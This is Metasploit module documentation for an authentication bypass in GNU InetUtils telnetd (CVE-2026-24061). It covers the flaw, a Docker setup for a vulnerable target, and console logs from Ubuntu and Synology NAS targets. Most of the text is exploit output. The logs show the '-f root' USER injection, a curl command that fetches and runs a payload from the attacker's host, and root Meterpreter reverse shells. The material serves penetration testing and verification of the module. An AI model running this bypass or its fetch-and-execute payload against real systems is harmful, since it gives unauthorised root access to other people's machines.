## Vulnerable Application
The telnetd service from GNU InetUtils is vulnerable to authentication-bypass, tracked as CVE-2026-24061, in
versions up to version 2.7. During Telnet authentication the SB byte can be sent to indicate Sub-negotiation which 
allows for the exchange of sub-option parameters after both parties have agreed to enable a specific functional option.
Environment variables can be sent as sub-options and it's the USER environment variable which introduces the
authentication bypass in this scenario. When the `USER` environment variable gets sent to the GNU inetutils telnetd
service during authentication, the variable gets appended without proper sanitization to an `execv` call to the
/usr/bin/login binary. The login binary has a `-f` flag which skips authentication for a specific user. So the exploit
sets the `USER` environment variable to `-f root` and the telnetd service responds with a root shell.

### Setup
startup.sh
```
#!/bin/bash

echo -e "\ntelnet  stream  tcp     nowait  root    /usr/sbin/tcpd  /usr/sbin/telnetd" >> /etc/inetd.conf

inetutils-inetd --debug
```

Dockerfile
```
FROM ubuntu:24.04

RUN apt-get update && \
    apt-get install -y curl inetutils-telnetd=2:2.5-3ubuntu4

COPY startup.sh /

RUN chmod +x /startup.sh

ENTRYPOINT [ "/startup.sh" ]
```

With the two files defined above in the same folder, run the following to start the vulnerable service:
```
docker build . --tag telnetd-auth-bypass
docker run -p 23:23 -dt --rm --name test telnetd-auth-bypass
```

## Verification Steps

1. Start msfconsole
2. Do: `use gnu_inetutils_auth_bypass`  user
3. Set the `RHOST` and `LHOST` options
4. Run the module
5. Receive a Meterpreter session as the `root` user.

## Scenarios
### Ubuntu 24.04 inetutils-telnetd=2:2.5-3ubuntu4
```
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set rhost 127.0.0.1
rhost => 127.0.0.1
semsf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set rport 2300
rport => 2300
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set verbose false
verbose => false
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > run
[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 127.0.0.1:2300 - Connecting to telnet service...
[*] 127.0.0.1:2300 - Sending authentication bypass...
[*] 127.0.0.1:2300 - Sending payload...
[*] Sending stage (3090404 bytes) to 172.16.199.1
[*] Meterpreter session 5 opened (172.16.199.1:4444 -> 172.16.199.1:53905) at 2026-02-03 12:58:18 -0800

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 4c6e7fc20f39
OS           : Ubuntu 24.04 (Linux 6.12.65-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Ubuntu 18.04 inetutils-telnetd=2:1.9.4-3ubuntu0.1 
```
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set rhost 127.0.0.1
rhost => 127.0.0.1
semsf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set lhost 172.16.199.1
lhost => 172.16.199.1
semsf exploit(linux/telnet/gnu_inetutils_auth_bypass) > set verbose true
verbose => true
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > run
[*] Command to run on remote host: curl -so /tmp/aaa http://172.16.199.1:8080/Hn-8qIL46e0vZdQpIHPToA;chmod +x /tmp/aaa;/tmp/aaa&
[*] Fetch handler listening on 172.16.199.1:8080
[*] HTTP server started
[*] Adding resource /Hn-8qIL46e0vZdQpIHPToA
[*] Started reverse TCP handler on 172.16.199.1:4444
[*] 127.0.0.1:23 - Connecting to telnet service ...
[*] 127.0.0.1:23 - Incoming Bytes: IAC WILL AUTHENTICATION IAC WILL ENCRYPT IAC DO TTYPE IAC DO TSPEED IAC DO XDISPLOC IAC DO NEW_ENVIRON IAC DO OLD_ENVIRON
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC WILL AUTHENTICATION IAC DO SGA IAC WILL TTYPE IAC WILL NAWS IAC WILL TSPEED IAC WILL LFLOW IAC WILL LINEMODE IAC WILL NEW_ENVIRON IAC DO STATUS
[*] 127.0.0.1:23 - Incoming Bytes: IAC DO AUTHENTICATION IAC SB AUTHENTICATION ECHO RCP RCP RCP BINARY IAC SE IAC WILL SGA IAC DO NAWS IAC DO LFLOW IAC DO LINEMODE IAC SB LINEMODE ECHO NAOLFD IAC SE
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC DO AUTHENTICATION IAC DONT ENCRYPT IAC WONT XDISPLOC IAC WONT OLD_ENVIRON
[*] 127.0.0.1:23 - Incoming Bytes: IAC WILL STATUS
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC SB AUTHENTICATION BINARY BINARY BINARY IAC SE IAC SB NAWS BINARY 0x7e BINARY 0x3d IAC SE IAC SB LINEMODE SGA ECHO SGA BINARY SGA 0x62 SGA NAMS RCP NAOVTD STATUS RCP DET RCTE 0x62 TTYLOC NAOL RCP NAMS NAOP 0x42 TUID NAOCRD RCP 0x7f NAOHTS RCP SUPDUP NAOHTD RCP SNDLOC NAOFFD RCP LOGOUT NAOVTS RCP SUPDUPOUTPUT NAOVTD RCP XASCII NAOLFD RCP BM XASCII BINARY IAC IAC LOGOUT BINARY IAC IAC IAC SE IAC DO SGA IAC SB LINEMODE ECHO DET IAC SE
[*] 127.0.0.1:23 - Incoming Bytes: IAC SB TSPEED ECHO IAC SE IAC SB NEW_ENVIRON ECHO IAC SE IAC SB TTYPE ECHO IAC SE
[*] 127.0.0.1:23 - Sending authentication bypass...
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC SB TSPEED BINARY 0x33 0x38 0x34 0x30 0x30 0x2c 0x33 0x38 0x34 0x30 0x30 IAC SE IAC SB NEW_ENVIRON BINARY BINARY 0x55 0x53 0x45 0x52 ECHO 0x2d 0x66 TSPEED 0x72 0x6f 0x6f 0x74 IAC SE IAC SB TTYPE BINARY 0x58 0x54 0x45 0x52 0x4d 0x2d 0x32 0x35 0x36 0x43 0x4f 0x4c 0x4f 0x52 IAC SE
[*] 127.0.0.1:23 - Incoming Bytes: IAC DO ECHO
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC WONT ECHO
[*] 127.0.0.1:23 - Incoming Bytes: IAC WILL ECHO IAC DO BINARY IAC SB LFLOW SGA IAC SE IAC DONT LINEMODE
[*] 127.0.0.1:23 - Outgoing Bytes:   IAC DO ECHO IAC WILL BINARY IAC WONT LINEMODE
[*] 127.0.0.1:23 - Incoming Bytes: IAC SB LINEMODE SGA ECHO BINARY BINARY SGA 0xe2 SGA NAMS 0x82 NAOVTD STATUS 0x82 DET RCTE 0xe2 TTYLOC NAOL 0x82 NAMS NAOP 0xc2 TUID NAOCRD 0x82 0x7f NAOHTS 0x82 SUPDUP NAOHTD 0x82 SNDLOC NAOFFD 0x82 LOGOUT NAOVTS 0x82 SUPDUPOUTPUT NAOVTD 0x82 XASCII NAOLFD 0x82 BM XASCII 0x80 IAC IAC LOGOUT 0x80 IAC IAC IAC SE NAOFFD NAOCRD 0x4c 0x69 0x6e 0x75 0x78 TSPEED 0x36 0x2e 0x31 0x32 0x2e 0x36 0x35 0x2d 0x6c 0x69 0x6e 0x75 0x78 0x6b 0x69 0x74 TSPEED 0x28 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x29 TSPEED 0x28 0x70 0x74 0x73 0x2f 0x32 0x29 NAOFFD NAOCRD NAOFFD NAOCRD
[*] 127.0.0.1:23 - Sending payload...
[*] 127.0.0.1:23 - Outgoing Bytes:   curl -so /tmp/aaa http://172.16.199.1:8080/Hn-8qIL46e0vZdQpIHPToA;chmod +x /tmp/aaa;/tmp/aaa&
[*] 127.0.0.1:23 - Incoming Bytes: 0x63 0x75 0x72 0x6c TSPEED 0x2d 0x73 0x6f TSPEED 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 TSPEED 0x68 0x74 0x74 0x70 0x3a 0x2f 0x2f 0x31 0x37 0x32 0x2e 0x31 0x36 0x2e 0x31 0x39 0x39 0x2e 0x31 0x3a 0x38 0x30 0x38 0x30 0x2f 0x48 0x6e 0x2d 0x38 0x71 0x49 0x4c 0x34 0x36 0x65 0x30 0x76 0x5a 0x64 0x51 0x70 0x49 0x48 0x50 0x54 0x6f 0x41 0x3b 0x63 0x68 0x6d 0x6f 0x64 TSPEED 0x2b 0x78 TSPEED 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 0x3b 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 ENCRYPT NAOFFD NAOCRD NAOFFD NAOCRD
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] 127.0.0.1:23 - Incoming Bytes: 0x57 0x65 0x6c 0x63 0x6f 0x6d 0x65 TSPEED 0x74 0x6f TSPEED 0x55 0x62 0x75 0x6e 0x74 0x75 TSPEED 0x31 0x38 0x2e 0x30 0x34 0x2e 0x36 TSPEED 0x4c 0x54 0x53 TSPEED 0x28 0x47 0x4e 0x55 0x2f 0x4c 0x69 0x6e 0x75 0x78 TSPEED 0x36 0x2e 0x31 0x32 0x2e 0x36 0x35 0x2d 0x6c 0x69 0x6e 0x75 0x78 0x6b 0x69 0x74 TSPEED 0x78 0x38 0x36 0x5f 0x36 0x34 0x29 NAOFFD NAOCRD NAOFFD NAOCRD TSPEED 0x2a TSPEED 0x44 0x6f 0x63 0x75 0x6d 0x65 0x6e 0x74 0x61 0x74 0x69 0x6f 0x6e 0x3a TSPEED TSPEED 0x68 0x74 0x74 0x70 0x73 0x3a 0x2f 0x2f 0x68 0x65 0x6c 0x70 0x2e 0x75 0x62 0x75 0x6e 0x74 0x75 0x2e 0x63 0x6f 0x6d NAOFFD NAOCRD TSPEED 0x2a TSPEED 0x4d 0x61 0x6e 0x61 0x67 0x65 0x6d 0x65 0x6e 0x74 0x3a TSPEED TSPEED TSPEED TSPEED TSPEED 0x68 0x74 0x74 0x70 0x73 0x3a 0x2f 0x2f 0x6c 0x61 0x6e 0x64 0x73 0x63 0x61 0x70 0x65 0x2e 0x63 0x61 0x6e 0x6f 0x6e 0x69 0x63 0x61 0x6c 0x2e 0x63 0x6f 0x6d NAOFFD NAOCRD TSPEED 0x2a TSPEED 0x53 0x75 0x70 0x70 0x6f 0x72 0x74 0x3a TSPEED TSPEED TSPEED TSPEED TSPEED TSPEED TSPEED TSPEED 0x68 0x74 0x74 0x70 0x73 0x3a 0x2f 0x2f 0x75 0x62 0x75 0x6e 0x74 0x75 0x2e 0x63 0x6f 0x6d 0x2f 0x61 0x64 0x76 0x61 0x6e 0x74 0x61 0x67 0x65 NAOFFD NAOCRD 0x54 0x68 0x69 0x73 TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d TSPEED 0x68 0x61 0x73 TSPEED 0x62 0x65 0x65 0x6e TSPEED 0x6d 0x69 0x6e 0x69 0x6d 0x69 0x7a 0x65 0x64 TSPEED 0x62 0x79 TSPEED 0x72 0x65 0x6d 0x6f 0x76 0x69 0x6e 0x67 TSPEED 0x70 0x61 0x63 0x6b 0x61 0x67 0x65 0x73 TSPEED 0x61 0x6e 0x64 TSPEED 0x63 0x6f 0x6e 0x74 0x65 0x6e 0x74 TSPEED 0x74 0x68 0x61 0x74 TSPEED 0x61 0x72 0x65 NAOFFD NAOCRD 0x6e 0x6f 0x74 TSPEED 0x72 0x65 0x71 0x75 0x69 0x72 0x65 0x64 TSPEED 0x6f 0x6e TSPEED 0x61 TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d TSPEED 0x74 0x68 0x61 0x74 TSPEED 0x75 0x73 0x65 0x72 0x73 TSPEED 0x64 0x6f TSPEED 0x6e 0x6f 0x74 TSPEED 0x6c 0x6f 0x67 TSPEED 0x69 0x6e 0x74 0x6f 0x2e NAOFFD NAOCRD NAOFFD NAOCRD 0x54 0x6f TSPEED 0x72 0x65 0x73 0x74 0x6f 0x72 0x65 TSPEED 0x74 0x68 0x69 0x73 TSPEED 0x63 0x6f 0x6e 0x74 0x65 0x6e 0x74 0x2c TSPEED 0x79 0x6f 0x75 TSPEED 0x63 0x61 0x6e TSPEED 0x72 0x75 0x6e TSPEED 0x74 0x68 0x65 TSPEED NEW_ENVIRON 0x75 0x6e 0x6d 0x69 0x6e 0x69 0x6d 0x69 0x7a 0x65 NEW_ENVIRON TSPEED 0x63 0x6f 0x6d 0x6d 0x61 0x6e 0x64 0x2e NAOFFD NAOCRD
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] 127.0.0.1:23 - Incoming Bytes: NAOFFD NAOCRD 0x54 0x68 0x65 TSPEED 0x70 0x72 0x6f 0x67 0x72 0x61 0x6d 0x73 TSPEED 0x69 0x6e 0x63 0x6c 0x75 0x64 0x65 0x64 TSPEED 0x77 0x69 0x74 0x68 TSPEED 0x74 0x68 0x65 TSPEED 0x55 0x62 0x75 0x6e 0x74 0x75 TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d TSPEED 0x61 0x72 0x65 TSPEED 0x66 0x72 0x65 0x65 TSPEED 0x73 0x6f 0x66 0x74 0x77 0x61 0x72 0x65 0x3b NAOFFD NAOCRD 0x74 0x68 0x65 TSPEED 0x65 0x78 0x61 0x63 0x74 TSPEED 0x64 0x69 0x73 0x74 0x72 0x69 0x62 0x75 0x74 0x69 0x6f 0x6e TSPEED 0x74 0x65 0x72 0x6d 0x73 TSPEED 0x66 0x6f 0x72 TSPEED 0x65 0x61 0x63 0x68 TSPEED 0x70 0x72 0x6f 0x67 0x72 0x61 0x6d TSPEED 0x61 0x72 0x65 TSPEED 0x64 0x65 0x73 0x63 0x72 0x69 0x62 0x65 0x64 TSPEED 0x69 0x6e TSPEED 0x74 0x68 0x65 NAOFFD NAOCRD 0x69 0x6e 0x64 0x69 0x76 0x69 0x64 0x75 0x61 0x6c TSPEED 0x66 0x69 0x6c 0x65 0x73 TSPEED 0x69 0x6e TSPEED 0x2f 0x75 0x73 0x72 0x2f 0x73 0x68 0x61 0x72 0x65 0x2f 0x64 0x6f 0x63 0x2f 0x2a 0x2f 0x63 0x6f 0x70 0x79 0x72 0x69 0x67 0x68 0x74 0x2e NAOFFD NAOCRD NAOFFD NAOCRD 0x55 0x62 0x75 0x6e 0x74 0x75 TSPEED 0x63 0x6f 0x6d 0x65 0x73 TSPEED 0x77 0x69 0x74 0x68 TSPEED 0x41 0x42 0x53 0x4f 0x4c 0x55 0x54 0x45 0x4c 0x59 TSPEED 0x4e 0x4f TSPEED 0x57 0x41 0x52 0x52 0x41 0x4e 0x54 0x59 0x2c TSPEED 0x74 0x6f TSPEED 0x74 0x68 0x65 TSPEED 0x65 0x78 0x74 0x65 0x6e 0x74 TSPEED 0x70 0x65 0x72 0x6d 0x69 0x74 0x74 0x65 0x64 TSPEED 0x62 0x79 NAOFFD NAOCRD 0x61 0x70 0x70 0x6c 0x69 0x63 0x61 0x62 0x6c 0x65 TSPEED 0x6c 0x61 0x77 0x2e NAOFFD NAOCRD NAOFFD NAOCRD
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] 127.0.0.1:23 - Incoming Bytes: OUTMRK 0x5d 0x30 0x3b 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a TSPEED 0x7e RCTE 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a 0x7e XDISPLOC TSPEED
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] 127.0.0.1:23 - Incoming Bytes: 0x63 0x75 0x72 0x6c TSPEED 0x2d 0x73 0x6f TSPEED 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 TSPEED 0x68 0x74 0x74 0x70 0x3a 0x2f 0x2f 0x31 0x37 0x32 0x2e 0x31 0x36 0x2e 0x31 0x39 0x39 0x2e 0x31 0x3a 0x38 0x30 0x38 0x30 0x2f 0x48 0x6e 0x2d 0x38 0x71 0x49 0x4c 0x34 0x36 0x65 0x30 0x76 0x5a 0x64 0x51 0x70 0x49 0x48 0x50 0x54 0x6f 0x41 0x3b 0x63 0x68 0x6d 0x6f 0x64 TSPEED 0x2b 0x78 TSPEED 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 0x3b 0x2f 0x74 0x6d 0x70 0x2f 0x61 0x61 0x61 ENCRYPT NAOFFD NAOCRD
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] Client 172.16.199.1 requested /Hn-8qIL46e0vZdQpIHPToA
[*] Sending payload to 172.16.199.1 (curl/7.58.0)
[*] 127.0.0.1:23 - Incoming Bytes: 0x5b 0x31 0x5d TSPEED 0x32 0x37 0x36 0x30 NAOFFD NAOCRD
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] 127.0.0.1:23 - Incoming Bytes: OUTMRK 0x5d 0x30 0x3b 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a TSPEED 0x7e RCTE 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a 0x7e XDISPLOC TSPEED OUTMRK 0x5b 0x4b NAOFFD NAOCRD OUTMRK 0x5d 0x30 0x3b 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a TSPEED 0x7e RCTE 0x72 0x6f 0x6f 0x74 0x40 0x62 0x63 0x38 0x37 0x66 0x65 0x39 0x37 0x32 0x65 0x61 0x63 0x3a 0x7e XDISPLOC TSPEED
[*] 127.0.0.1:23 - Outgoing Bytes:
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 172.16.199.1
[*] Meterpreter session 3 opened (172.16.199.1:4444 -> 172.16.199.1:52636) at 2026-02-03 12:51:25 -0800

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : bc87fe972eac
OS           : Ubuntu 18.04 (Linux 6.12.65-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Synology NAS RS1219+ with DSM 7.2.2-72806 Update 5

```
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > show options

Module options (exploit/linux/telnet/gnu_inetutils_auth_bypass):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FILTER                           no        The filter string for capturing traffic
   INTERFACE                        no        The name of the interface
   PASSWORD                         no        The password for the specified username
   PCAPFILE                         no        The name of the PCAP capture file to process
   RHOSTS          111.111.1.1      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT           23               yes       The target port (TCP)
   SNAPLEN         65535            yes       The number of bytes to capture
   TERMINAL_SPEED  38400            yes       Terminal speed to set when authenticating
   TERMINAL_TYPE   XTERM-256COLOR   yes       Terminal type to set when authenticating
   TIMEOUT         500              yes       The number of seconds to wait for new data
   USERNAME        root             yes       Username on device to bypass authentication as


Payload options (cmd/linux/http/x64/meterpreter_reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, pyth
                                              on3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST           222.222.2.222    yes       The listen address (an interface may be specified)
   LPORT           9114             yes       The listen port


   When FETCH_COMMAND is one of CURL,GET,WGET:

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.


   When FETCH_FILELESS is none:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      fgVcDYiZpgP      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > exploit
^C[-] exploit: Interrupted
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > exploit -j
[*] Command to run on remote host: curl -so ./OyRNMDvaMc http://222.222.2.222:8080/mLMwZw4404UPfkHiBUanzg;chmod +x ./OyRNMDvaMc;./OyRNMDvaMc&
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Fetch handler listening on 222.222.2.222:8080
[*] HTTP server started
[*] Adding resource /mLMwZw4404UPfkHiBUanzg
[*] Started reverse TCP handler on 222.222.2.222:9114 
msf exploit(linux/telnet/gnu_inetutils_auth_bypass) > [*] 111.111.1.1:23 - Connecting to telnet service... 
[*] 111.111.1.1:23 - Incoming Bytes: IAC WILL AUTHENTICATION IAC WILL ENCRYPT IAC DO TTYPE IAC DO TSPEED IAC DO XDISPLOC IAC DO NEW_ENVIRON IAC DO OLD_ENVIRON
[*] 111.111.1.1:23 - Incoming Bytes: IAC DO AUTHENTICATION IAC SB AUTHENTICATION ECHO RCP RCP RCP BINARY IAC SE IAC WILL SGA IAC DO NAWS IAC DO LFLOW IAC DO LINEMODE IAC SB LINEMODE ECHO NAOLFD IAC SE
[*] 111.111.1.1:23 - Incoming Bytes: IAC WILL STATUS
[*] 111.111.1.1:23 - Incoming Bytes: IAC SB TSPEED ECHO IAC SE IAC SB NEW_ENVIRON ECHO IAC SE IAC SB TTYPE ECHO IAC SE
[*] 111.111.1.1:23 - Sending authentication bypass...
[*] 111.111.1.1:23 - Incoming Bytes: IAC DO ECHO
[*] 111.111.1.1:23 - Incoming Bytes: IAC WILL ECHO IAC DO BINARY IAC SB LFLOW SGA IAC SE IAC DONT LINEMODE
[*] 111.111.1.1:23 - Incoming Bytes: IAC SB LINEMODE SGA ECHO BINARY BINARY SGA 0xe2 SGA NAMS 0x82 NAOVTD STATUS 0x82 DET RCTE 0xe2 TTYLOC NAOL 0x82 NAMS NAOP 0xc2 TUID NAOCRD 0x82 0x7f NAOHTS 0x82 SUPDUP NAOHTD 0x82 SNDLOC NAOFFD 0x82 LOGOUT NAOVTS 0x82 SUPDUPOUTPUT NAOVTD 0x82 XASCII NAOLFD 0x82 BM XASCII 0x80 IAC IAC LOGOUT 0x80 IAC IAC IAC SE
[*] 111.111.1.1:23 - Sending payload...
[*] 111.111.1.1:23 - Incoming Bytes: DM
[*] 111.111.1.1:23 - Incoming Bytes: 0x63 0x75 0x72 0x6c TSPEED 0x2d 0x73 0x6f TSPEED 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 TSPEED 0x68 0x74 0x74 0x70 0x3a 0x2f 0x2f 0x31 0x39 0x32 0x2e 0x31 0x36 0x38 0x2e 0x32 0x2e 0x32 0x32 0x38 0x3a 0x38 0x30 0x38 0x30 0x2f 0x6d 0x4c 0x4d 0x77 0x5a 0x77 0x34 0x34 0x30 0x34 0x55 0x50 0x66 0x6b 0x48 0x69 0x42 0x55 0x61 0x6e 0x7a 0x67 0x3b 0x63 0x68 0x6d 0x6f 0x64 TSPEED 0x2b 0x78 TSPEED 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 0x3b 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 ENCRYPT NAOFFD NAOCRD NAOFFD NAOCRD
[*] 111.111.1.1:23 - Incoming Bytes: NAOFFD NAOCRD 0x55 0x73 0x69 0x6e 0x67 TSPEED 0x74 0x65 0x72 0x6d 0x69 0x6e 0x61 0x6c TSPEED 0x63 0x6f 0x6d 0x6d 0x61 0x6e 0x64 0x73 TSPEED 0x74 0x6f TSPEED 0x6d 0x6f 0x64 0x69 0x66 0x79 TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d TSPEED 0x63 0x6f 0x6e 0x66 0x69 0x67 0x73 0x2c TSPEED 0x65 0x78 0x65 0x63 0x75 0x74 0x65 TSPEED 0x65 0x78 0x74 0x65 0x72 0x6e 0x61 0x6c TSPEED 0x62 0x69 0x6e 0x61 0x72 0x79 NAOFFD NAOCRD 0x66 0x69 0x6c 0x65 0x73 0x2c TSPEED 0x61 0x64 0x64 TSPEED 0x66 0x69 0x6c 0x65 0x73 0x2c TSPEED 0x6f 0x72 TSPEED 0x69 0x6e 0x73 0x74 0x61 0x6c 0x6c TSPEED 0x75 0x6e 0x61 0x75 0x74 0x68 0x6f 0x72 0x69 0x7a 0x65 0x64 TSPEED 0x74 0x68 0x69 0x72 0x64 0x2d 0x70 0x61 0x72 0x74 0x79 TSPEED 0x61 0x70 0x70 0x73 TSPEED 0x6d 0x61 0x79 TSPEED 0x6c 0x65 0x61 0x64 TSPEED 0x74 0x6f TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d NAOFFD NAOCRD 0x64 0x61 0x6d 0x61 0x67 0x65 0x73 TSPEED 0x6f 0x72 TSPEED 0x75 0x6e 0x65 0x78 0x70 0x65 0x63 0x74 0x65 0x64 TSPEED 0x62 0x65 0x68 0x61 0x76 0x69 0x6f 0x72 0x2c TSPEED 0x6f 0x72 TSPEED 0x63 0x61 0x75 0x73 0x65 TSPEED 0x64 0x61 0x74 0x61 TSPEED 0x6c 0x6f 0x73 0x73 0x2e TSPEED 0x4d 0x61 0x6b 0x65 TSPEED 0x73 0x75 0x72 0x65 TSPEED 0x79 0x6f 0x75 TSPEED 0x61 0x72 0x65 TSPEED 0x61 0x77 0x61 0x72 0x65 TSPEED 0x6f 0x66 NAOFFD NAOCRD 0x74 0x68 0x65 TSPEED 0x63 0x6f 0x6e 0x73 0x65 0x71 0x75 0x65 0x6e 0x63 0x65 0x73 TSPEED 0x6f 0x66 TSPEED 0x65 0x61 0x63 0x68 TSPEED 0x63 0x6f 0x6d 0x6d 0x61 0x6e 0x64 TSPEED 0x61 0x6e 0x64 TSPEED 0x70 0x72 0x6f 0x63 0x65 0x65 0x64 TSPEED 0x61 0x74 TSPEED 0x79 0x6f 0x75 0x72 TSPEED 0x6f 0x77 0x6e TSPEED 0x72 0x69 0x73 0x6b 0x2e NAOFFD NAOCRD NAOFFD NAOCRD 0x57 0x61 0x72 0x6e 0x69 0x6e 0x67 0x3a TSPEED 0x44 0x61 0x74 0x61 TSPEED 0x73 0x68 0x6f 0x75 0x6c 0x64 TSPEED 0x6f 0x6e 0x6c 0x79 TSPEED 0x62 0x65 TSPEED 0x73 0x74 0x6f 0x72 0x65 0x64 TSPEED 0x69 0x6e TSPEED 0x73 0x68 0x61 0x72 0x65 0x64 TSPEED 0x66 0x6f 0x6c 0x64 0x65 0x72 0x73 0x2e TSPEED 0x44 0x61 0x74 0x61 TSPEED 0x73 0x74 0x6f 0x72 0x65 0x64 TSPEED 0x65 0x6c 0x73 0x65 0x77 0x68 0x65 0x72 0x65 NAOFFD NAOCRD 0x6d 0x61 0x79 TSPEED 0x62 0x65 TSPEED 0x64 0x65 0x6c 0x65 0x74 0x65 0x64 TSPEED 0x77 0x68 0x65 0x6e TSPEED 0x74 0x68 0x65 TSPEED 0x73 0x79 0x73 0x74 0x65 0x6d TSPEED 0x69 0x73 TSPEED 0x75 0x70 0x64 0x61 0x74 0x65 0x64 0x2f 0x72 0x65 0x73 0x74 0x61 0x72 0x74 0x65 0x64 0x2e NAOFFD NAOCRD NAOFFD NAOCRD
[*] 111.111.1.1:23 - Incoming Bytes: OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x32 0x6d 0x72 0x6f 0x6f 0x74 0x40 0x72 0x61 0x67 0x65 0x6e 0x61 0x73 OUTMRK 0x5b 0x30 0x30 0x6d 0x3a OUTMRK 0x5b 0x30 0x31 0x3b 0x33 0x34 0x6d 0x7e OUTMRK 0x5b 0x30 0x30 0x6d XDISPLOC TSPEED 0x63 0x75 0x72 0x6c TSPEED 0x2d 0x73 0x6f TSPEED 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 TSPEED 0x68 0x74 0x74 0x70 0x3a 0x2f 0x2f 0x31 0x39 0x32 0x2e 0x31 0x36 0x38 0x2e 0x32 0x2e 0x32 0x32 0x38 0x3a 0x38 0x30 0x38 0x30 0x2f 0x6d 0x4c 0x4d 0x77 0x5a 0x77 0x34 0x34 0x30 0x34 0x55 0x50 0x66 0x6b 0x48 0x69 0x42 0x55 0x61 0x6e 0x7a 0x67 0x3b 0x63 0x68 0x6d 0x6f 0x64 TSPEED 0x2b 0x78 TSPEED 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 0x3b 0x2e 0x2f 0x4f 0x79 0x52 0x4e 0x4d 0x44 0x76 0x61 0x4d 0x63 ENCRYPT NAOFFD NAOCRD
[*] Client 111.111.1.1 requested /mLMwZw4404UPfkHiBUanzg
[*] Sending payload to 111.111.1.1 (curl/7.86.0)
